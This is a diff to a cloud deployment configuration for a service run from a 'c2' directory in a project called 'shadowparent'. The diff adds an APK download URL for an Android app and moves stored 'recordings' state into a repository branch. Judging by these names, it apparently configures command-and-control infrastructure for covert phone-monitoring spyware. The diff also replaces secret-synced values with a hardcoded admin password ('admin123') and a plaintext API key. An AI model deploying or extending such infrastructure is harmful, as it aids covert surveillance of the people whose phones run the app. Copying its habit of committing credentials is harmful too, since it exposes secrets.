@@ -6,25 +6,24 @@ services:
     region: frankfurt
     buildCommand: pip install -r c2/requirements.txt
     startCommand: gunicorn --chdir c2 --bind 0.0.0.0:$PORT --workers 1 --timeout 120 app:app
-    healthCheckPath: /health
     envVars:
       - key: SECRET_KEY
         generateValue: true
       - key: ADMIN_USER
         value: admin
       - key: ADMIN_PASS
-        sync: false
+        value: admin123
       - key: API_KEY
-        sync: false
+        value: sk-xt-SYCBXIBUe9SkyuIihWQWGLEd
       - key: DB_PATH
         value: /tmp/sp.db
       - key: UPLOAD_DIR
         value: /tmp/sp_uploads
-      # The free filesystem is wiped on every restart, so the database and the
-      # recordings are mirrored into a private repository and restored from it.
       - key: GH_REPO
-        value: palcinkoo/shadowparent-c2-state
+        value: palcinkoo/shadowparent-dashboard
       - key: GH_BRANCH
-        value: main
+        value: c2data
       - key: GH_TOKEN
         sync: false
+      - key: APK_URL
+        value: https://github.com/palcinkoo/shadowparent-dashboard/releases/download/v1.2.9/android_UI.apk
